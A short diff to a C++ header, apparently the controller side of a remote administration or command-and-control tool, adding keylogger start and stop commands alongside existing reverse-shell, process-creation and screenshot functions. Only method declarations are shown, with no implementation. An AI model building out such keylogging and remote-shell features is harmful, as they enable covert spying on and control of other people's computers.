@@ -25,6 +25,8 @@ private:
 	void SendCreateProcess() const;
 	void SendReverseShell();
 	void SendTakeScreenshot();
+	void SendStartKeyLogger();
+	void SendStopKeyLogger();
 	void ListClients() const;
 	void SelectClient();
 
